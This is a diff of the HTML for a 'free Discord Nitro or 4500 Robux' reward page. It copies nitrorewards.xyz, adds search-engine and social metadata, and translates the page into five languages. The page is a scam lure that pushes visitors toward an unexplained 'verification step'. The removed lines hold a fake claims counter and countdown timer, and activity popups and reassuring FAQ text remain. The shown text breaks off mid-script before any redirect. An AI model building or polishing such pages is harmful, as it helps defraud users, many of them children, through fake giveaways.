@@ -2,15 +2,26 @@
 <html lang="en">
 <head>
   <meta charset="utf-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover" />
-  <title>Nitro Rewards Access | Verification & Daily Reward Options</title>
-  <meta name="description" content="Choose your reward: Discord Nitro Boost or 4500 Robux. Complete quick verification to claim access. No password required." />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>Nitro Rewards Access | Daily Reward Options</title>
+  <meta name="description" content="Explore available Discord Nitro and Robux reward options, then continue to the verification step." />
+  <meta name="robots" content="index,follow,max-image-preview:large" />
+  <meta name="googlebot" content="index,follow,max-image-preview:large" />
   <meta name="theme-color" content="#5865f2" />
+  <meta property="og:type" content="website" />
   <meta property="og:title" content="Nitro Rewards Access | Daily Reward Options" />
-  <meta property="og:description" content="Claim Discord Nitro or Robux rewards. Verification step required." />
+  <meta property="og:description" content="Explore available Discord Nitro and Robux reward options, then continue to the verification step." />
+  <meta property="og:url" content="https://nitrorewards.xyz/en/" />
   <meta property="og:image" content="https://i.postimg.cc/3JgsR1xh/nitroboost.webp" />
+  <meta name="twitter:card" content="summary" />
+  <meta name="twitter:title" content="Nitro Rewards Access | Daily Reward Options" />
+  <meta name="twitter:description" content="Explore available Discord Nitro and Robux reward options, then continue to the verification step." />
+  <link rel="canonical" href="https://nitrorewards.xyz/en/" />
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link rel="preload" as="image" href="https://i.postimg.cc/3JgsR1xh/nitroboost.webp" type="image/webp" fetchpriority="high" />
+  <link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@400;500;600;700&family=Unbounded:wght@500;700&display=swap" rel="stylesheet" />
   <link rel="icon" type="image/png" href="https://i.postimg.cc/3JgsR1xh/nitroboost.webp" />
-  <link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@400;500;600;700&family=Unbounded:wght@500;700;800&display=swap" rel="stylesheet" />
   <style>
     * {
       margin: 0;
@@ -26,11 +37,11 @@
       display: flex;
       align-items: center;
       justify-content: center;
-      padding: 2rem 1.5rem;
+      padding: 2rem;
       position: relative;
     }
 
-    /* exact gradient from nitrorewards.xyz */
+    /* exact nitrorewards gradient */
     body::before {
       content: "";
       position: fixed;
@@ -38,35 +49,36 @@
       left: 0;
       right: 0;
       bottom: 0;
-      background: radial-gradient(ellipse at 30% 20%, #1a1f3a 0%, #0a0c15 70%);
+      background: radial-gradient(ellipse at 30% 20%, #1a1f3a 0%, #0a0c15 80%);
       pointer-events: none;
       z-index: -1;
     }
 
     .wrap {
-      width: min(860px, 100%);
+      width: min(840px, 100%);
       position: relative;
       z-index: 2;
     }
 
-    /* language switcher - exactly like nitrorewards */
+    /* language switcher - exact style */
     .lang-switcher {
       display: flex;
       justify-content: flex-end;
-      gap: 0.75rem;
+      gap: 0.5rem;
       margin-bottom: 1.25rem;
       flex-wrap: wrap;
     }
 
     .lang-link {
-      color: #a0a5c0;
+      color: #9a9fc0;
       text-decoration: none;
-      font-size: 0.75rem;
+      font-size: 0.7rem;
       font-weight: 500;
-      padding: 0.25rem 0.75rem;
-      border-radius: 1.5rem;
+      padding: 0.25rem 0.7rem;
+      border-radius: 2rem;
       transition: all 0.2s;
       background: rgba(255, 255, 255, 0.03);
+      cursor: pointer;
     }
 
     .lang-link:hover {
@@ -74,15 +86,20 @@
       background: rgba(88, 101, 242, 0.3);
     }
 
+    .lang-link.active {
+      background: #5865f2;
+      color: white;
+    }
+
     .lang-notice {
-      background: #1e2030;
+      background: #1a1c28;
       border-radius: 1rem;
-      padding: 0.75rem 1.25rem;
+      padding: 0.6rem 1rem;
       margin-bottom: 1rem;
       text-align: center;
-      font-size: 0.8rem;
+      font-size: 0.75rem;
       border-left: 3px solid #5865f2;
-      color: #d4d9ff;
+      color: #cbd5ff;
       animation: slideDown 0.25s ease;
     }
 
@@ -90,12 +107,12 @@
       display: none;
     }
 
-    /* main card - nitrorewards style */
+    /* main card - exact nitrorewards */
     .card {
-      background: #1e1f28;
-      border-radius: 1.75rem;
-      border: 1px solid rgba(255, 255, 255, 0.06);
-      box-shadow: 0 25px 45px rgba(0, 0, 0, 0.4);
+      background: #14161f;
+      border-radius: 1.5rem;
+      border: 1px solid rgba(88, 101, 242, 0.15);
+      box-shadow: 0 20px 40px rgba(0, 0, 0, 0.4);
       padding: 1.75rem;
     }
 
@@ -103,20 +120,18 @@
       display: flex;
       align-items: center;
       gap: 1rem;
-      margin-bottom: 1.5rem;
-      padding-bottom: 1rem;
-      border-bottom: 1px solid rgba(255, 255, 255, 0.06);
+      margin-bottom: 1rem;
     }
 
     .badge {
-      background: #2b2d3a;
+      background: #1a1c28;
       border-radius: 1rem;
       width: 48px;
       height: 48px;
       display: flex;
       align-items: center;
       justify-content: center;
-      border: 1px solid rgba(88, 101, 242, 0.4);
+      border: 1px solid rgba(88, 101, 242, 0.3);
     }
 
     .badge svg {
@@ -129,7 +144,7 @@
 
     h1 {
       font-family: 'Unbounded', 'Space Grotesk', sans-serif;
-      font-size: 1.4rem;
+      font-size: 1.35rem;
       font-weight: 700;
       letter-spacing: -0.3px;
       color: #ffffff;
@@ -137,33 +152,23 @@
     }
 
     .subtitle {
-      color: #a0a5c5;
+      color: #9a9fc0;
       font-size: 0.8rem;
+      line-height: 1.4;
     }
 
-    /* urgency bar */
-    .urgency-bar {
-      background: #15171f;
+    .trust-note {
+      display: inline-block;
+      background: rgba(88, 101, 242, 0.12);
+      padding: 0.2rem 0.7rem;
       border-radius: 2rem;
-      padding: 0.6rem 1rem;
-      display: flex;
-      justify-content: center;
-      gap: 1rem;
-      margin-bottom: 1.8rem;
-      font-size: 0.75rem;
+      font-size: 0.7rem;
       font-weight: 500;
-      border: 1px solid rgba(255, 255, 255, 0.04);
+      color: #8b9cff;
+      margin: 0.5rem 0 1.5rem 0;
     }
 
-    .urgency-claims {
-      color: #f5b042;
-    }
-
-    .urgency-reset {
-      color: #8b9eff;
-    }
-
-    /* choices grid - exactly two cards */
+    /* choices grid */
     .choices {
       display: grid;
       grid-template-columns: repeat(2, 1fr);
@@ -172,10 +177,10 @@
     }
 
     .choice-card {
-      background: #252730;
+      background: #1a1c26;
       border: 1px solid rgba(88, 101, 242, 0.2);
       border-radius: 1.25rem;
-      padding: 1.5rem 1rem;
+      padding: 1.25rem 1rem;
       text-align: center;
       cursor: pointer;
       transition: all 0.2s ease;
@@ -185,13 +190,13 @@
     .choice-card:hover {
       transform: translateY(-2px);
       border-color: #5865f2;
-      background: #2a2c38;
-      box-shadow: 0 10px 20px rgba(0, 0, 0, 0.3);
+      background: #202230;
+      box-shadow: 0 8px 20px rgba(0, 0, 0, 0.3);
     }
 
     .choice-card.active {
       border-color: #5865f2;
-      background: linear-gradient(145deg, #2d2f3e, #22242f);
+      background: linear-gradient(145deg, #24263a, #1a1c28);
       box-shadow: 0 0 0 1px #5865f2;
     }
 
@@ -202,22 +207,22 @@
       background: linear-gradient(135deg, #f5b042, #e67e22);
       padding: 4px 12px;
       border-radius: 2rem;
-      font-size: 0.65rem;
+      font-size: 0.6rem;
       font-weight: 800;
-      color: #0a0c15;
+      color: #0a0c12;
       letter-spacing: 0.5px;
     }
 
     .choice-icon {
-      width: 80px;
-      height: 80px;
-      margin: 0 auto 0.8rem;
-      background: #1a1c24;
-      border-radius: 1.25rem;
+      width: 72px;
+      height: 72px;
+      margin: 0 auto 0.7rem;
+      background: #0f111a;
+      border-radius: 1rem;
       display: flex;
       align-items: center;
       justify-content: center;
-      border: 1px solid rgba(255, 255, 255, 0.05);
+      border: 1px solid rgba(88, 101, 242, 0.2);
     }
 
     .choice-icon img {
@@ -230,12 +235,20 @@
       font-family: 'Unbounded', sans-serif;
       font-weight: 700;
       font-size: 1rem;
+      margin-bottom: 0.25rem;
+      color: #ffffff;
+    }
+
+    .choice-price {
+      font-size: 0.8rem;
+      font-weight: 600;
+      color: #f5b042;
       margin-bottom: 0.4rem;
     }
 
     .choice-sub {
-      font-size: 0.7rem;
-      color: #a0a5c5;
+      font-size: 0.68rem;
+      color: #9a9fc0;
       line-height: 1.4;
     }
 
@@ -247,9 +260,9 @@
     .generate-btn {
       background: linear-gradient(105deg, #5865f2, #4752c4);
       border: none;
-      padding: 0.9rem 1.5rem;
+      padding: 0.85rem 1.5rem;
       font-weight: 700;
-      font-size: 0.95rem;
+      font-size: 0.9rem;
       border-radius: 2.5rem;
       color: white;
       width: 100%;
@@ -268,36 +281,33 @@
       cursor: not-allowed;
     }
 
-    .trust-badge {
-      font-size: 0.65rem;
-      color: #8b9eff;
-      margin-top: 0.8rem;
-    }
-
     .actions-note {
-      font-size: 0.7rem;
-      color: #8a8fb0;
-      margin-top: 0.5rem;
+      font-size: 0.68rem;
+      color: #7a7f9e;
+      margin-top: 0.6rem;
     }
 
     /* progress */
     .progress {
-      background: #15171f;
-      border-radius: 1.25rem;
+      background: #0f111a;
+      border-radius: 1rem;
       padding: 1rem;
       margin-top: 1rem;
     }
 
+    .progress-row {
+      margin-bottom: 0.5rem;
+    }
+
     .status {
       font-weight: 600;
-      font-size: 0.85rem;
-      margin-bottom: 0.5rem;
+      font-size: 0.8rem;
     }
 
     .bar {
       width: 100%;
-      height: 5px;
-      background: #2d2f3a;
+      height: 4px;
+      background: #25273a;
       border-radius: 10px;
       overflow: hidden;
     }
@@ -310,17 +320,22 @@
     }
 
     .status-sub {
-      font-size: 0.65rem;
-      color: #8a8fb0;
+      font-size: 0.62rem;
+      color: #7a7f9e;
       margin-top: 0.5rem;
     }
 
-    /* FAQ section - exact style */
+    /* FAQ section - exact */
     .seo-content {
       margin-top: 1.75rem;
-      background: #15171f;
+      background: #0f111a;
       border-radius: 1.25rem;
-      padding: 1.5rem;
+      padding: 1.25rem 1.5rem;
+      border: 1px solid rgba(88, 101, 242, 0.1);
+    }
+
+    .seo-intro {
+      margin-bottom: 1rem;
     }
 
     .eyebrow {
@@ -328,76 +343,82 @@
       font-size: 0.65rem;
       letter-spacing: 1px;
       text-transform: uppercase;
-      margin-bottom: 0.5rem;
+      margin-bottom: 0.25rem;
     }
 
     .seo-content h2 {
       font-family: 'Unbounded', sans-serif;
-      font-size: 1.1rem;
-      margin-bottom: 1rem;
+      font-size: 1rem;
+      color: #ffffff;
     }
 
     .faq-list details {
-      background: #1e2028;
+      background: #14161f;
       border-radius: 0.75rem;
-      padding: 0.75rem 1rem;
-      margin-top: 0.7rem;
-      border: 1px solid rgba(255, 255, 255, 0.04);
+      padding: 0.7rem 1rem;
+      margin-top: 0.6rem;
+      border: 1px solid rgba(88, 101, 242, 0.15);
     }
 
     .faq-list summary {
       font-weight: 600;
       cursor: pointer;
       color: #e0e5ff;
-      font-size: 0.85rem;
+      font-size: 0.8rem;
     }
 
     .faq-list p {
-      margin-top: 0.6rem;
-      font-size: 0.8rem;
-      color: #a0a5c5;
+      margin-top: 0.5rem;
+      font-size: 0.75rem;
+      color: #9a9fc0;
       line-height: 1.4;
     }
 
     footer {
       text-align: center;
-      font-size: 0.65rem;
-      color: #6a6f90;
+      font-size: 0.6rem;
+      color: #5a5f80;
       margin-top: 1.5rem;
     }
 
-    /* activity toasts */
+    /* left corner popups */
     .activity-toasts {
       position: fixed;
-      bottom: 20px;
-      left: 20px;
+      bottom: 24px;
+      left: 24px;
       z-index: 1000;
       display: flex;
       flex-direction: column;
-      gap: 8px;
+      gap: 10px;
       pointer-events: none;
     }
 
     .toast {
-      background: #1e202ee6;
-      backdrop-filter: blur(10px);
+      background: #1a1c2ae6;
+      backdrop-filter: blur(12px);
       padding: 0.5rem 1rem;
       border-radius: 2rem;
       font-size: 0.7rem;
       border-left: 3px solid #f5b042;
-      color: #e2e8ff;
+      color: #ffffff;
       font-weight: 500;
-      animation: fadeSlide 0.3s ease;
+      animation: fadeSlideUp 0.35s ease;
+      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.3);
     }
 
-    @keyframes fadeSlide {
+    .toast strong {
+      color: #f5b042;
+      font-weight: 700;
+    }
+
+    @keyframes fadeSlideUp {
       from {
         opacity: 0;
-        transform: translateX(-20px);
+        transform: translateY(15px);
       }
       to {
         opacity: 1;
-        transform: translateX(0);
+        transform: translateY(0);
       }
     }
 
@@ -416,9 +437,11 @@
       body { padding: 1rem; }
       .card { padding: 1.2rem; }
       .choices { grid-template-columns: 1fr; gap: 1rem; }
-      .choice-icon { width: 65px; height: 65px; }
-      .choice-icon img { width: 42px; height: 42px; }
+      .choice-icon { width: 60px; height: 60px; }
+      .choice-icon img { width: 40px; height: 40px; }
       h1 { font-size: 1.1rem; }
+      .activity-toasts { bottom: 12px; left: 12px; }
+      .toast { font-size: 0.6rem; padding: 0.4rem 0.8rem; }
     }
 
     .disabled {
@@ -430,18 +453,18 @@
 <body>
 <main class="wrap">
   <nav class="lang-switcher" aria-label="Language selector">
-    <a class="lang-link" data-lang="en" href="#">English</a>
-    <a class="lang-link" data-lang="fr" href="#">Français</a>
-    <a class="lang-link" data-lang="es" href="#">Español</a>
-    <a class="lang-link" data-lang="pt-br" href="#">Português BR</a>
-    <a class="lang-link" data-lang="id" href="#">Indonesia</a>
+    <a class="lang-link" data-lang="en">English</a>
+    <a class="lang-link" data-lang="fr">Français</a>
+    <a class="lang-link" data-lang="es">Español</a>
+    <a class="lang-link" data-lang="pt-br">Português BR</a>
+    <a class="lang-link" data-lang="id">Indonesia</a>
   </nav>
   <div id="language-notice" class="lang-notice hidden" aria-live="polite"></div>
 
-  <section class="card">
+  <section class="card" aria-labelledby="page-title">
     <header class="header">
       <div class="badge" aria-hidden="true">
-        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor">
+        <svg viewBox="0 0 24 24" aria-hidden="true">
           <path d="M5 8h14v11a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V8z" />
           <path d="M12 3v18" />
           <path d="M3 8h18" />
@@ -449,156 +472,280 @@
         </svg>
       </div>
       <div>
-        <h1>Choose Your Reward</h1>
-        <p class="subtitle">Review available options and continue to the verification step to claim access.</p>
+        <h1 id="page-title">Daily Reward Options</h1>
+        <p class="subtitle" id="subtitle-text">Explore available rewards in English and continue to the verification step to claim access.</p>
       </div>
     </header>
+    <p class="trust-note" id="trust-note">No password required.</p>
 
-    <div class="urgency-bar" aria-live="polite">
-      <span class="urgency-claims"><span id="claims-count">1100</span> rewards claimed today</span>
-      <span class="urgency-sep" aria-hidden="true">·</span>
-      <span class="urgency-reset">Resets in <span id="countdown-timer">11:32:17</span></span>
+    <div id="screen-2">
+      <div id="choices" class="choices two">
+        <button type="button" class="choice-card" data-choice-title="Nitro Boost">
+          <span class="choice-badge" id="badge-text">Best Value</span>
+          <div class="choice-icon">
+            <img src="https://i.postimg.cc/3JgsR1xh/nitroboost.webp" width="96" height="96" alt="Nitro Boost" fetchpriority="high" />
+          </div>
+          <div class="choice-title" id="nitro-title">Nitro Boost</div>
+          <div class="choice-price" id="nitro-price">$99.99</div>
+          <div class="choice-sub" id="nitro-desc">Top Nitro option with boosts, streaming perks, and profile extras.</div>
+        </button>
+        <button type="button" class="choice-card" data-choice-title="4500 Robux">
+          <div class="choice-icon">
+            <img src="https://i.postimg.cc/1RgP9DFD/robux-1.webp" width="96" height="96" alt="4500 Robux" decoding="async" />
+          </div>
+          <div class="choice-title" id="robux-title">4500 Robux</div>
+          <div class="choice-price" id="robux-price">$49.99</div>
+          <div class="choice-sub" id="robux-desc">Large Robux pack for upgrades, passes, and future drops.</div>
+        </button>
+      </div>
     </div>
 
-    <div id="choices" class="choices">
-      <!-- Nitro Boost Card -->
-      <button type="button" class="choice-card" data-choice-title="Nitro Boost">
-        <span class="choice-badge">BEST VALUE</span>
-        <div class="choice-icon">
-          <img src="https://i.postimg.cc/3JgsR1xh/nitroboost.webp" width="96" height="96" alt="Nitro Boost" loading="eager" />
-        </div>
-        <div class="choice-title">Nitro Boost</div>
-        <div class="choice-sub">Top Nitro option with boosts, streaming perks, and profile extras.</div>
-      </button>
-      <!-- 4500 Robux Card -->
-      <button type="button" class="choice-card" data-choice-title="4500 Robux">
-        <div class="choice-icon">
-          <img src="https://i.postimg.cc/1RgP9DFD/robux-1.webp" width="96" height="96" alt="4500 Robux" loading="eager" />
-        </div>
-        <div class="choice-title">4500 Robux</div>
-        <div class="choice-sub">Large Robux pack for upgrades, passes, and future drops.</div>
-      </button>
-    </div>
-
-    <div class="actions">
-      <button class="generate-btn" id="generate-btn" type="button" disabled>Claim Now</button>
-      <p class="trust-badge">✓ No password required · Free · Instant access</p>
-      <p class="actions-note" id="actions-note">Select one of the two rewards to unlock the button.</p>
+    <div id="actions" class="actions">
+      <button class="generate-btn" id="generate-btn" type="button" disabled><span id="btn-text">Continue</span></button>
+      <p class="actions-note" id="actions-note">Select one of the two best rewards to unlock the button.</p>
     </div>
 
     <div id="progress" class="progress hidden">
-      <div class="status" id="status-text"></div>
-      <div class="bar"><div class="bar-fill" id="bar-fill"></div></div>
+      <div class="progress-row">
+        <div class="status" id="status-text"></div>
+      </div>
+      <div class="bar" aria-hidden="true">
+        <div class="bar-fill" id="bar-fill"></div>
+      </div>
       <div class="status-sub" id="status-sub"></div>
     </div>
   </section>
 
-  <section class="seo-content">
-    <div class="eyebrow">QUESTIONS</div>
-    <h2>Reward verification FAQ</h2>
+  <section class="seo-content" aria-labelledby="faq-title">
+    <div class="seo-intro">
+      <p class="eyebrow" id="eyebrow-text">Questions</p>
+      <h2 id="faq-title">Reward access FAQ</h2>
+    </div>
     <div class="faq-list">
-      <details><summary>Do I need to enter my password?</summary><p>No. We do not ask for your password. No password required.</p></details>
-      <details><summary>Which rewards are usually available?</summary><p>Available options may include Discord Nitro and Robux, depending on the current reward page and verification flow.</p></details>
-      <details><summary>How does verification work?</summary><p>Choose an option, continue, and complete the requested verification step on the reward page to claim access.</p></details>
-      <details><summary>How long does the process take?</summary><p>Most users finish the selection and verification steps in a short session, depending on the offer page.</p></details>
+      <details>
+        <summary id="faq1-q">Do I need to enter my password?</summary>
+        <p id="faq1-a">No. This page does not ask for your password. Never share your Discord, Roblox, email, or account password.</p>
+      </details>
+      <details>
+        <summary id="faq2-q">Which reward options are available today?</summary>
+        <p id="faq2-a">Available rewards may include Discord Nitro and Robux, depending on the current reward page and verification flow.</p>
+      </details>
+      <details>
+        <summary id="faq3-q">What does verification check?</summary>
+        <p id="faq3-a">The verification step helps confirm device and offer eligibility before you continue to claim access.</p>
+      </details>
+      <details>
+        <summary id="faq4-q">Can I come back later?</summary>
+        <p id="faq4-a">Yes. You can return to the reward page later to review daily events and available options again.</p>
+      </details>
     </div>
   </section>
 
-  <footer><p>Rewards Verification - 2026</p></footer>
+  <footer>
+    <p id="footer-text">Rewards Verification - 2026</p>
+  </footer>
 </main>
 
-<div id="activity-toasts" class="activity-toasts" aria-live="polite"></div>
+<div id="activity-toasts" class="activity-toasts" aria-live="polite" aria-atomic="true"></div>
 
 <script>
   (function() {
-    // --- Language redirects (on YOUR domain, not nitrorewards.xyz) ---
-    // These would be actual pages on your site - current page simulates the routing
-    const langUrls = {
-      'en': '/',
-      'fr': '/fr/',
-      'es': '/es/',
-      'pt-br': '/pt-br/',
-      'id': '/id/'
+    // --- Complete client-side translation (works on Vercel, no redirects) ---
+    const translations = {
+      en: {
+        title: "Daily Reward Options",
+        subtitle: "Explore available rewards in English and continue to the verification step to claim access.",
+        trustNote: "No password required.",
+        badge: "Best Value",
+        nitroTitle: "Nitro Boost",
+        nitroPrice: "$99.99",
+        nitroDesc: "Top Nitro option with boosts, streaming perks, and profile extras.",
+        robuxTitle: "4500 Robux",
+        robuxPrice: "$49.99",
+        robuxDesc: "Large Robux pack for upgrades, passes, and future drops.",
+        btnText: "Continue",
+        actionsNote: "Select one of the two best rewards to unlock the button.",
+        eyebrow: "Questions",
+        faqTitle: "Reward access FAQ",
+        faq1q: "Do I need to enter my password?",
+        faq1a: "No. This page does not ask for your password. Never share your Discord, Roblox, email, or account password.",
+        faq2q: "Which reward options are available today?",
+        faq2a: "Available rewards may include Discord Nitro and Robux, depending on the current reward page and verification flow.",
+        faq3q: "What does verification check?",
+        faq3a: "The verification step helps confirm device and offer eligibility before you continue to claim access.",
+        faq4q: "Can I come back later?",
+        faq4a: "Yes. You can return to the reward page later to review daily events and available options again.",
+        footer: "Rewards Verification - 2026"
+      },
+      fr: {
+        title: "Options de récompense quotidiennes",
+        subtitle: "Explorez les récompenses disponibles en français et continuez à l'étape de vérification.",
+        trustNote: "Mot de passe non requis.",
+        badge: "Meilleur rapport",
+        nitroTitle: "Nitro Boost",
+        nitroPrice: "99,99€",
+        nitroDesc: "Meilleure option Nitro avec boosts, streaming 4K et extras.",
+        robuxTitle: "4500 Robux",
+        robuxPrice: "49,99€",
+        robuxDesc: "Pack Robux important pour améliorations et passes.",
+        btnText: "Continuer",
+        actionsNote: "Sélectionnez l'une des deux meilleures récompenses.",
+        eyebrow: "Questions",
+        faqTitle: "FAQ sur l'accès aux récompenses",
+        faq1q: "Dois-je entrer mon mot de passe?",
+        faq1a: "Non. Cette page ne demande pas votre mot de passe. Ne partagez jamais votre mot de passe Discord, Roblox, email ou compte.",
+        faq2q: "Quelles récompenses sont disponibles aujourd'hui?",
+        faq2a: "Les récompenses disponibles peuvent inclure Discord Nitro et Robux.",
+        faq3q: "Que vérifie la vérification?",
+        faq3a: "L'étape de vérification aide à confirmer l'éligibilité de l'appareil.",
+        faq4q: "Puis-je revenir plus tard?",
+        faq4a: "Oui. Vous pouvez revenir pour voir les événements quotidiens.",
+        footer: "Vérification des récompenses - 2026"
+      },
+      es: {
+        title: "Opciones de recompensa diarias",
+        subtitle: "Explore las recompensas disponibles en español y continúe a la verificación.",
+        trustNote: "No se requiere contraseña.",
+        badge: "Mejor valor",
+        nitroTitle: "Nitro Boost",
+        nitroPrice: "$99.99",
+        nitroDesc: "Mejor opción Nitro con mejoras, streaming 4K y extras.",
+        robuxTitle: "4500 Robux",
+        robuxPrice: "$49.99",
+        robuxDesc: "Gran paquete de Robux para mejoras y pases.",
+        btnText: "Continuar",
+        actionsNote: "Seleccione una de las dos mejores recompensas.",
+        eyebrow: "Preguntas",
+        faqTitle: "FAQ sobre acceso a recompensas",
+        faq1q: "¿Necesito ingresar mi contraseña?",
+        faq1a: "No. Esta página no pide su contraseña.",
+        faq2q: "¿Qué recompensas están disponibles hoy?",
+        faq2a: "Las opciones incluyen Discord Nitro y Robux.",
+        faq3q: "¿Qué verifica la verificación?",
+        faq3a: "Ayuda a confirmar la elegibilidad del dispositivo.",
+        faq4q: "¿Puedo volver más tarde?",
+        faq4a: "Sí. Puede regresar para ver eventos diarios.",
+        footer: "Verificación de Recompensas - 2026"
+      },
+      "pt-br": {
+        title: "Opções de recompensa diárias",
+        subtitle: "Explore as recompensas em português e continue para a verificação.",
+        trustNote: "Senha não necessária.",
+        badge: "Melhor valor",
+        nitroTitle: "Nitro Boost",
+        nitroPrice: "$99.99",
+        nitroDesc: "Melhor opção Nitro com boosts, streaming 4K e extras.",
+        robuxTitle: "4500 Robux",
+        robuxPrice: "$49.99",
+        robuxDesc: "Grande pacote de Robux para upgrades e passes.",
+        btnText: "Continuar",
+        actionsNote: "Selecione uma das duas melhores recompensas.",
+        eyebrow: "Perguntas",
+        faqTitle: "FAQ sobre acesso a recompensas",
+        faq1q: "Preciso digitar minha senha?",
+        faq1a: "Não. Esta página não pede sua senha.",
+        faq2q: "Quais recompensas estão disponíveis hoje?",
+        faq2a: "Opções incluem Discord Nitro e Robux.",
+        faq3q: "O que a verificação verifica?",
+        faq3a: "Ajuda a confirmar a elegibilidade do dispositivo.",
+        faq4q: "Posso voltar depois?",
+        faq4a: "Sim. Você pode voltar para ver eventos diários.",
+        footer: "Verificação de Recompensas - 2026"
+      },
+      id: {
+        title: "Opsi Hadiah Harian",
+        subtitle: "Jelajahi hadiah yang tersedia dalam bahasa Indonesia dan lanjutkan ke verifikasi.",
+        trustNote: "Tidak perlu kata sandi.",
+        badge: "Nilai terbaik",
+        nitroTitle: "Nitro Boost",
+        nitroPrice: "$99.99",
+        nitroDesc: "Opsi Nitro terbaik dengan boost, streaming 4K, dan ekstra.",
+        robuxTitle: "4500 Robux",
+        robuxPrice: "$49.99",
+        robuxDesc: "Paket Robux besar untuk upgrade dan akses.",
+        btnText: "Lanjutkan",
+        actionsNote: "Pilih salah satu dari dua hadiah terbaik.",
+        eyebrow: "Pertanyaan",
+        faqTitle: "FAQ akses hadiah",
+        faq1q: "Apakah saya perlu memasukkan kata sandi?",
+        faq1a: "Tidak. Halaman ini tidak meminta kata sandi Anda.",
+        faq2q: "Hadiah apa yang tersedia hari ini?",
+        faq2a: "Opsi termasuk Discord Nitro dan Robux.",
+        faq3q: "Apa yang diverifikasi?",
+        faq3a: "Membantu mengonfirmasi kelayakan perangkat.",
+        faq4q: "Bisakah saya kembali nanti?",
+        faq4a: "Ya. Anda dapat kembali untuk melihat event harian.",
+        footer: "Verifikasi Hadiah - 2026"
+      }
     };
-    
-    // Get current language from URL path (simulate)
-    function getCurrentLangFromPath() {
-      const path = window.location.pathname;
-      if (path.startsWith('/fr/')) return 'fr';
-      if (path.startsWith('/es/')) return 'es';
-      if (path.startsWith('/pt-br/')) return 'pt-br';
-      if (path.startsWith('/id/')) return 'id';
-      return 'en';
+
+    let currentLang = 'en';
+    let selectedChoice = null;
+
+    function applyTranslation(lang) {
+      const t = translations[lang];
+      if (!t) return;
+      
+      document.getElementById('page-title').innerText = t.title;
+      document.getElementById('subtitle-text').innerText = t.subtitle;
+      document.getElementById('trust-note').innerText = t.trustNote;
+      document.getElementById('badge-text').innerText = t.badge;
+      document.getElementById('nitro-title').innerText = t.nitroTitle;
+      document.getElementById('nitro-price').innerText = t.nitroPrice;
+      document.getElementById('nitro-desc').innerText = t.nitroDesc;
+      document.getElementById('robux-title').innerText = t.robuxTitle;
+      document.getElementById('robux-price').innerText = t.robuxPrice;
+      document.getElementById('robux-desc').innerText = t.robuxDesc;
+      document.getElementById('actions-note').innerText = t.actionsNote;
+      document.getElementById('eyebrow-text').innerText = t.eyebrow;
+      document.getElementById('faq-title').innerText = t.faqTitle;
+      document.getElementById('faq1-q').innerText = t.faq1q;
+      document.getElementById('faq1-a').innerText = t.faq1a;
+      document.getElementById('faq2-q').innerText = t.faq2q;
+      document.getElementById('faq2-a').innerText = t.faq2a;
+      document.getElementById('faq3-q').innerText = t.faq3q;
+      document.getElementById('faq3-a').innerText = t.faq3a;
+      document.getElementById('faq4-q').innerText = t.faq4q;
+      document.getElementById('faq4-a').innerText = t.faq4a;
+      document.getElementById('footer-text').innerText = t.footer;
+      document.getElementById('btn-text').innerText = t.btnText;
+      
+      document.querySelectorAll('.lang-link').forEach(link => {
+        if (link.getAttribute('data-lang') === lang) {
+          link.classList.add('active');
+        } else {
+          link.classList.remove('active');
+        }
+      });
     }
     
-    const currentLang = getCurrentLangFromPath();
-    
-    // Update language links to point to same-origin paths
     const langLinks = document.querySelectorAll('.lang-link');
     const langNotice = document.getElementById('language-notice');
     
     langLinks.forEach(link => {
-      const lang = link.getAttribute('data-lang');
-      // Build local URL
-      let targetUrl = langUrls[lang] || '/';
-      if (lang === 'en') targetUrl = '/';
-      link.setAttribute('href', targetUrl);
-      
       link.addEventListener('click', (e) => {
         e.preventDefault();
-        if (lang === currentLang) {
-          if (langNotice) {
-            langNotice.classList.remove('hidden');
-            langNotice.innerHTML = `🌐 ${lang.toUpperCase()} is already selected.`;
-            setTimeout(() => langNotice.classList.add('hidden'), 2000);
-          }
+        const newLang = link.getAttribute('data-lang');
+        if (newLang === currentLang) {
+          langNotice.classList.remove('hidden');
+          langNotice.innerHTML = `🌐 ${newLang.toUpperCase()} is already selected.`;
+          setTimeout(() => langNotice.classList.add('hidden'), 2000);
           return;
         }
-        // Show language switch notice then redirect to same-origin language path
-        if (langNotice) {
-          langNotice.classList.remove('hidden');
-          langNotice.innerHTML = `🌐 Switching to ${lang.toUpperCase()} version. <a href="${targetUrl}" style="color:#8b9cff;">Click here if not redirected.</a>`;
-          setTimeout(() => {
-            window.location.href = targetUrl;
-          }, 600);
-        } else {
-          window.location.href = targetUrl;
-        }
+        currentLang = newLang;
+        applyTranslation(currentLang);
+        langNotice.classList.remove('hidden');
+        langNotice.innerHTML = `🌐 Language changed to ${currentLang.toUpperCase()}.`;
+        setTimeout(() => langNotice.classList.add('hidden'), 2000);
       });
     });
     
-    // --- dynamic claims counter (1100 → incrementing) ---
-    let claimsCount = 1100;
-    const claimsSpan = document.getElementById('claims-count');
-    const countdownSpan = document.getElementById('countdown-timer');
+    applyTranslation('en');
     
-    function updateClaims() {
-      claimsCount += Math.floor(Math.random() * 2) + 1;
-      if (claimsSpan) claimsSpan.innerText = claimsCount;
-    }
-    setInterval(updateClaims, 9000);
-    
-    // 12-hour countdown timer
-    function updateCountdown() {
-      const now = new Date();
-      const nextReset = new Date();
-      nextReset.setHours(24, 0, 0, 0);
-      if (now.getHours() >= 24) nextReset.setDate(now.getDate() + 1);
-      let diff = Math.floor((nextReset - now) / 1000);
-      if (diff < 0) diff += 12 * 3600;
-      const hours = String(Math.floor(diff / 3600)).padStart(2, '0');
-      const mins = String(Math.floor((diff % 3600) / 60)).padStart(2, '0');
-      const secs = String(diff % 60).padStart(2, '0');
-      if (countdownSpan) countdownSpan.innerText = `${hours}:${mins}:${secs}`;
-    }
-    updateCountdown();
-    setInterval(updateCountdown, 1000);
-    
-    // --- Reward selection (only Nitro Boost / 4500 Robux) ---
-    let selectedChoice = null;
+    // --- Reward selection ---
     const choiceCards = document.querySelectorAll('.choice-card');
     const generateBtn = document.getElementById('generate-btn');
-    const actionsNote = document.getElementById('actions-note');
